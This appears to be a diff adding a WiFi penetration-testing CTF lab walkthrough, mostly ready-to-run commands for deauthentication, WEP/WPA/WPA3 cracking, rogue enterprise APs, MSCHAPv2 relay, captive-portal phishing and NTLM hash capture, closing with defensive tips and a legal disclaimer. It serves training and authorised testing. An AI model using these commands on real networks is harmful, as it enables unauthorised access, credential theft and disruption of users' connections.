@@ -1,0 +1,658 @@
+# WiFiChallenge Lab v2.0
+WiFi Penetration Testing
+
+## Index
+
+1. [Environment Setup](#environment-setup)
+2. [Reconnaissance](#reconnaissance)
+3. [Open Networks (OPN)](#open-networks-opn)
+4. [WEP Attacks](#wep-attacks)
+5. [WPA/WPA2 PSK Attacks](#wpawpa2-psk-attacks)
+6. [WPA3 SAE Attacks](#wpa3-sae-attacks)
+7. [Enterprise Networks (MGT)](#enterprise-networks-mgt)
+8. [Advanced Attacks](#advanced-attacks)
+9. [WIDS Evasion](#wids-evasion)
+
+## Environment Setup
+
+### Initial VM Configuration
+
+```bash
+# Check initial flag
+sudo su
+cat /root/flag.txt
+
+# Create working directory
+mkdir ~/wifi
+cd ~/wifi
+
+# Start monitor mode
+sudo airmon-ng start wlan0
+```
+
+### Essential Tools
+- `airmon-ng` - Monitor mode management
+- `airodump-ng` - Wireless packet capture
+- `aireplay-ng` - Packet injection
+- `aircrack-ng` - Password cracking
+- `wpa_supplicant` - Client connection
+- `hostapd-mana` - Rogue AP creation
+- `eaphammer` - Enterprise attacks
+- `hashcat` - Advanced password cracking
+
+## Reconnaissance
+
+### Basic Network Discovery
+
+```bash
+# Full spectrum scan (2.4GHz + 5GHz)
+sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
+
+# Channel-specific scan
+sudo airodump-ng wlan0mon -w ~/wifi/scanc[CHANNEL] --manufacturer --wps -c [CHANNEL]
+```
+
+### Client Analysis
+
+```bash
+# Monitor specific AP for clients
+sudo airodump-ng wlan0mon -c [CHANNEL] --bssid [AP_MAC] -w ~/wifi/clients
+
+# Analyze probe requests (look at bottom section of airodump output)
+```
+
+### Hidden SSID Discovery
+
+```bash
+# Create custom wordlist with wifi- prefix
+cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
+
+# Brute force hidden ESSID
+airmon-ng start wlan0 
+iwconfig wlan0mon channel [CHANNEL]
+mdk4 wlan0mon p -t [HIDDEN_AP_MAC] -f ~/wifi-rockyou.txt
+```
+
+## Open Networks (OPN)
+
+### Connection Configuration
+
+```bash
+# Create connection profile for open network
+cat > free.conf << EOF
+network={
+    ssid="[NETWORK_NAME]"
+    key_mgmt=NONE
+    scan_ssid=1
+}
+EOF
+
+# Connect to network
+wpa_supplicant -Dnl80211 -iwlan2 -c free.conf &
+dhclient wlan2 -v
+```
+
+### MAC Address Spoofing for Captive Portal Bypass
+
+```bash
+# Stop network manager
+systemctl stop network-manager
+
+# Change MAC to connected client
+ip link set wlan2 down
+macchanger -m [CLIENT_MAC] wlan2
+ip link set wlan2 up
+
+# Reconnect
+wpa_supplicant -Dnl80211 -iwlan2 -c free.conf &
+dhclient wlan2 -v
+```
+
+### Traffic Analysis for Credentials
+
+```bash
+# Analyze captured traffic
+wireshark ~/wifi/scan-01.cap
+
+# Filter for HTTP POST requests containing credentials
+# Look for: http.request.method == "POST"
+```
+
+## WEP Attacks
+
+### Automated Attack with Besside-ng
+
+```bash
+# Kill interfering processes
+airmon-ng check kill
+
+# Automated WEP crack
+besside-ng -c [CHANNEL] -b [AP_MAC] wlan2 -v
+```
+
+### Manual WEP Attack
+
+```bash
+# Capture data packets
+sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w wep-capture wlan0mon
+
+# Fake authentication (in parallel)
+sudo aireplay-ng -1 3600 -q 10 -a [AP_MAC] wlan0mon
+
+# ARP replay attack (in parallel)
+sudo aireplay-ng --arpreplay -b [AP_MAC] -h [CLIENT_MAC] wlan0mon
+
+# Crack password (in parallel)
+sudo aircrack-ng wep-capture-01.cap
+```
+
+### WEP Connection
+
+```bash
+cat > wep.conf << EOF
+network={
+    ssid="[NETWORK_NAME]"
+    key_mgmt=NONE
+    wep_key0=[HEX_PASSWORD]
+    wep_tx_keyidx=0
+}
+EOF
+
+wpa_supplicant -D nl80211 -i wlan2 -c wep.conf &
+dhclient wlan2 -v
+```
+
+## WPA/WPA2 PSK Attacks
+
+### Handshake Capture
+
+```bash
+# Monitor target network
+airodump-ng wlan0mon -w ~/wifi/handshake -c [CHANNEL] --bssid [AP_MAC] --wps
+
+# Force deauthentication (in parallel)
+aireplay-ng -0 10 -a [AP_MAC] wlan0mon
+```
+
+### Password Cracking
+
+```bash
+# Crack with aircrack-ng
+aircrack-ng ~/wifi/handshake-01.cap -w ~/rockyou-top100000.txt
+
+# Alternative: Convert to hashcat format and use GPU acceleration
+aircrack-ng handshake-01.cap -j hashcat-format
+hashcat -a 0 -m 2500 hashcat-format.hccap ~/rockyou-top100000.txt --force
+```
+
+### Traffic Decryption Post-Crack
+
+```bash
+# Decrypt captured traffic
+airdecap-ng -e [NETWORK_NAME] -p [PASSWORD] ~/wifi/handshake-01.cap
+
+# Analyze decrypted traffic
+wireshark ~/wifi/handshake-01-dec.cap
+```
+
+### Network Connection and Analysis
+
+```bash
+cat > psk.conf << EOF
+network={
+    ssid="[NETWORK_NAME]"
+    psk="[PASSWORD]"
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}
+EOF
+
+wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf &
+dhclient wlan3 -v
+
+# Test client isolation
+arp-scan -I wlan3 -l
+curl [TARGET_IP]
+```
+
+### Rogue AP for Unknown Networks
+
+```bash
+cat > hostapd.conf << EOF
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=1
+ssid=[TARGET_SSID]
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+EOF
+
+hostapd-mana hostapd.conf
+# Wait for AP-STA-POSSIBLE-PSK-MISMATCH, then Ctrl+C
+
+# Crack captured handshake
+hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
+```
+
+## WPA3 SAE Attacks
+
+### Direct SAE Attack
+
+```bash
+cd ~/tools/wacker
+./wacker.py --wordlist ~/rockyou-top100000.txt --ssid [NETWORK_NAME] --bssid [AP_MAC] --interface wlan2 --freq [FREQUENCY]
+```
+
+### SAE Downgrade Attack
+
+```bash
+cat > hostapd-sae.conf << EOF
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=[CHANNEL]
+ssid=[NETWORK_NAME]
+mana_wpaout=hostapd-downgrade.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+EOF
+
+hostapd-mana hostapd-sae.conf &
+
+# Deauth clients to force downgrade (if 802.11w disabled)
+iwconfig wlan0mon channel [CHANNEL]
+aireplay-ng wlan0mon -0 0 -a [AP_MAC] -c [CLIENT_MAC]
+```
+
+## Enterprise Networks (MGT)
+
+### Passive Reconnaissance
+
+#### Identity Collection
+
+```bash
+# Monitor enterprise network
+airodump-ng wlan0mon -w ~/wifi/enterprise -c [CHANNEL] --wps
+
+# Extract identities with tshark
+tshark -r ~/wifi/enterprise-01.cap -Y '(eap && wlan.ra == [AP_MAC]) && (eap.identity)' -T fields -e eap.identity
+
+# Alternative: Use wifi_db
+cd /root/tools/wifi_db
+python3 wifi_db.py -d wifichallenge.SQLITE ~/wifi/
+```
+
+#### Certificate Analysis
+
+```bash
+# Extract certificates with tshark
+tshark -r ~/wifi/enterprise-01.cap -Y "wlan.bssid == [AP_MAC] && ssl.handshake.type == 11" -V
+
+# Extract email addresses from certificates
+tshark -r ~/wifi/enterprise-01.cap -Y "wlan.bssid == [AP_MAC] && x509sat.IA5String" -T fields -e x509sat.IA5String
+```
+
+### EAP Method Discovery
+
+```bash
+cd /root/tools/EAP_buster/
+bash ./EAP_buster.sh [NETWORK_NAME] '[DOMAIN\USERNAME]' wlan1
+```
+
+### Rogue AP Attacks
+
+#### Basic Enterprise Rogue AP
+
+```bash
+cd /root/tools/eaphammer
+
+# Generate self-signed certificate
+python3 ./eaphammer --cert-wizard
+
+# Launch rogue AP
+python3 ./eaphammer -i wlan3 --auth wpa-eap --essid [NETWORK_NAME] --creds --negotiate balanced
+
+# Deauth clients (in parallel)
+iwconfig wlan0mon channel [CHANNEL]
+aireplay-ng -0 0 -a [AP_MAC] wlan0mon -c [CLIENT_MAC]
+```
+
+#### Crack MSCHAPv2 Hashes
+
+```bash
+# Extract hashcat format from logs
+cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
+hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
+```
+
+### Credential Attacks
+
+#### Username Bruteforce
+
+```bash
+cd ~/tools/air-hammer
+echo '[DOMAIN\username]' > test.user
+./air-hammer.py -i wlan3 -e [NETWORK_NAME] -p ~/rockyou-top100000.txt -u test.user
+```
+
+#### Password Spray
+
+```bash
+# Prepare domain user list
+cat ~/top-usernames-shortlist.txt | awk '{print "[DOMAIN]\\" $1}' > ~/domain-users.txt
+
+cd ~/tools/air-hammer
+./air-hammer.py -i wlan4 -e [NETWORK_NAME] -P [PASSWORD] -u ~/domain-users.txt
+```
+
+### MSCHAPv2 Relay Attacks
+
+#### Setup for Relay
+
+```bash
+# Set MAC address for rogue AP
+systemctl stop network-manager
+airmon-ng stop wlan1mon
+ip link set wlan1 down
+macchanger -m F0:9F:C2:00:00:00 wlan1
+ip link set wlan1 up
+```
+
+#### Configure wpa_sycophant
+
+```bash
+cat > ~/tools/wpa_sycophant/relay.conf << EOF
+network={
+    ssid="[TARGET_NETWORK]"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    identity=""
+    anonymous_identity=""
+    password=""
+    eap=PEAP
+    phase1="crypto_binding=0 peaplabel=0"
+    phase2="auth=MSCHAPV2"
+    bssid_blacklist=F0:9F:C2:00:00:00
+}
+EOF
+```
+
+#### Execute Relay Attack
+
+```bash
+# Terminal 1: Launch rogue AP with relay capability
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo [TARGET_NETWORK]
+
+# Terminal 2: Deauth target client
+iwconfig wlan0mon channel [CHANNEL]
+aireplay-ng -0 0 wlan0mon -a [AP_MAC] -c [CLIENT_MAC]
+
+# Terminal 3: Execute relay
+cd ~/tools/wpa_sycophant/
+./wpa_sycophant.sh -c relay.conf -i wlan3
+
+# Terminal 4: Get IP once connected
+dhclient wlan3 -v
+```
+
+### Certificate-Based Attacks
+
+#### Using Legitimate Certificates
+
+```bash
+# Import legitimate certificates (obtained through previous attacks)
+cd /root/tools/eaphammer
+python3 ./eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key --private-key-passwd whatever
+
+# Launch rogue AP with legitimate certificates
+python3 ./eaphammer -i wlan4 --auth wpa-eap --essid [NETWORK_NAME] --creds --negotiate balanced
+```
+
+#### Client Certificate Generation
+
+```bash
+# Generate client certificate using CA
+openssl genrsa -out client.key 2048
+openssl req -config client.conf -new -key client.key -out client.csr
+openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
+
+# Create connection profile
+cat > wpa_tls.conf << EOF
+network={
+    ssid="[NETWORK_NAME]"
+    scan_ssid=1
+    mode=0
+    proto=RSN
+    key_mgmt=WPA-EAP
+    auth_alg=OPEN
+    eap=TLS
+    identity="[DOMAIN\USERNAME]"
+    ca_cert="./ca.crt"
+    client_cert="./client.crt"
+    private_key="./client.key"
+    private_key_passwd="whatever"
+}
+EOF
+
+wpa_supplicant -Dnl80211 -i wlan4 -c wpa_tls.conf &
+dhclient wlan4 -v
+```
+
+## Advanced Attacks
+
+### Captive Portal Phishing
+
+```bash
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+
+# Launch captive portal attack
+./eaphammer --essid [TARGET_PROBE] --interface wlan4 --captive-portal
+
+# Deauth target client (in parallel)
+iwconfig wlan0mon channel [CHANNEL]
+aireplay-ng -0 0 wlan0mon -a [AP_MAC] -c [CLIENT_MAC]
+```
+
+### Hostile Portal with Responder
+
+```bash
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+
+# Launch hostile portal
+./eaphammer --essid [TARGET_PROBE] --interface wlan2 --hostile-portal
+
+# Extract and crack captured hashes
+cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600
+hashcat -a 0 -m 5600 responder.5600 ~/rockyou-top100000.txt --force
+```
+
+### Certificate Preparation for Advanced Attacks
+
+```bash
+# Convert certificates to proper formats
+openssl x509 -in ca.crt -out hostapd.ca.pem -outform PEM
+openssl x509 -in server.crt -out hostapd.cert.pem -outform PEM
+openssl rsa -in server.key -out hostapd.key.pem
+openssl dhparam -out hostapd.dh.pem 2048
+
+# Use with berate_ap
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan4 lo [NETWORK_NAME] --eap-cert-path /path/to/certs/
+```
+
+## WIDS Evasion
+
+### Nzyme Analysis
+
+```bash
+# Access WIDS interface
+firefox http://127.0.0.1:22900/
+
+# Default credentials: admin/admin
+# Check alerts section for attack detection
+# Identify oldest alerts and attacker MAC addresses
+```
+
+## Hash Format Conversions
+
+### Legacy to Modern Formats
+
+```bash
+# Convert hccapx to pcap
+hcxhash2cap --hccapx=capture.hccapx -c output.pcap
+
+# Convert pcap to hashcat 22000 format
+hcxpcapngtool output.pcap -o hash.22000
+
+# Crack with modern hashcat
+hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force
+```
+
+## Common Troubleshooting
+
+### Monitor Mode Issues
+
+```bash
+# Kill interfering processes
+airmon-ng check kill
+
+# Restart NetworkManager if needed
+systemctl restart network-manager
+
+# Reset interface
+airmon-ng stop wlan0mon
+airmon-ng start wlan0
+```
+
+### Connection Problems
+
+```bash
+# Reset interface
+ip link set wlan2 down
+ip link set wlan2 up
+
+# Force DHCP release/renewal
+dhclient -r wlan2
+dhclient wlan2 -v
+```
+
+### Hashcat Performance
+
+```bash
+# Force CPU usage if GPU unavailable
+hashcat --force
+
+# Check available hash modes
+hashcat --help | grep -i wpa
+```
+
+## CTF-Specific Challenge Solutions
+
+### Challenge Flow Summary
+
+1. **VM Setup** → Get root flag from `/root/flag.txt`
+2. **Reconnaissance** → Map all networks, channels, clients, probes
+3. **Open Networks** → Bypass captive portals, extract credentials
+4. **WEP** → Automated and manual cracking approaches
+5. **WPA/WPA2** → Handshake capture, traffic decryption, client isolation testing
+6. **WPA3** → Direct attacks and downgrade techniques
+7. **Enterprise** → Passive recon, rogue APs, relay attacks, certificate abuse
+8. **Advanced** → Phishing portals, certificate generation, WIDS analysis
+
+### Key CTF Techniques
+
+#### Multiple Terminal Management
+```bash
+# Use tmux for better session management
+tmux new-session -d -s wifi
+tmux split-window -h
+tmux split-window -v
+# Ctrl+B, Arrow keys to navigate between panes
+```
+
+#### Automated Data Collection
+```bash
+# Script for continuous monitoring
+#!/bin/bash
+mkdir -p ~/wifi/captures
+while true; do
+    airodump-ng wlan0mon -w ~/wifi/captures/scan_$(date +%Y%m%d_%H%M%S) --band abg
+    sleep 300
+done
+```
+
+#### Quick Network Profiling
+```bash
+# Extract network info quickly
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.ssid -e wlan.bssid -e radiotap.channel.freq | sort -u
+```
+
+## Key Commands Reference
+
+| Tool | Purpose | Example |
+|------|---------|---------|
+| `airodump-ng` | Packet capture | `airodump-ng wlan0mon -c 6 -w capture` |
+| `aireplay-ng` | Packet injection | `aireplay-ng -0 10 -a [AP] wlan0mon` |
+| `aircrack-ng` | Password cracking | `aircrack-ng -w wordlist capture.cap` |
+| `hashcat` | Advanced cracking | `hashcat -m 2500 hash.hccap wordlist` |
+| `wpa_supplicant` | Client connection | `wpa_supplicant -i wlan0 -c config.conf` |
+| `hostapd-mana` | Rogue AP | `hostapd-mana config.conf` |
+| `eaphammer` | Enterprise attacks | `eaphammer --auth wpa-eap --essid test` |
+| `mdk4` | Various attacks | `mdk4 wlan0mon p -t [MAC] -f wordlist` |
+| `besside-ng` | Automated WEP | `besside-ng -c 1 -b [MAC] wlan0` |
+| `wacker` | WPA3 SAE attacks | `wacker.py --ssid test --bssid [MAC]` |
+
+## Network Types Quick Reference
+
+### Open Networks (OPN)
+- **Identification**: `AUTH: OPN`, no encryption
+- **Attack Vector**: Direct connection, MAC spoofing for captive portals
+- **Tools**: `wpa_supplicant`, `macchanger`
+
+### WEP Networks  
+- **Identification**: `ENC: WEP`
+- **Attack Vector**: IV collection and statistical analysis
+- **Tools**: `besside-ng`, `aircrack-ng`, manual replay attacks
+
+### WPA/WPA2 PSK
+- **Identification**: `AUTH: PSK`, `ENC: TKIP/CCMP`
+- **Attack Vector**: 4-way handshake capture and dictionary attacks
+- **Tools**: `aireplay-ng`, `aircrack-ng`, `hashcat`
+
+### WPA3 SAE
+- **Identification**: `AUTH: SAE`, `ENC: CCMP`
+- **Attack Vector**: Direct SAE attacks or downgrade to PSK
+- **Tools**: `wacker`, `hostapd-mana` for downgrade
+
+### Enterprise (MGT)
+- **Identification**: `AUTH: MGT`, various EAP methods
+- **Attack Vector**: Rogue APs, relay attacks, certificate abuse
+- **Tools**: `eaphammer`, `wpa_sycophant`, `berate_ap`
+
+## Security Best Practices (Defense)
+
+### For Network Administrators
+- Enable 802.11w (Management Frame Protection) on WPA3 networks
+- Use strong, unique certificates for enterprise networks
+- Implement proper certificate validation on clients
+- Monitor for rogue APs using WIDS/WIPS solutions
+- Regularly audit client configurations and stored networks
+
+### For Clients
+- Validate certificates manually when connecting to new enterprise networks
+- Remove old/unused network profiles
+- Use randomized MAC addresses when available
+- Avoid connecting to open networks for sensitive activities
+
+---
+
+**Legal Disclaimer**: This manual is intended for educational purposes and authorized penetration testing only. Always ensure you have explicit written permission before testing any wireless networks. Unauthorized access to computer networks is illegal in most jurisdictions.
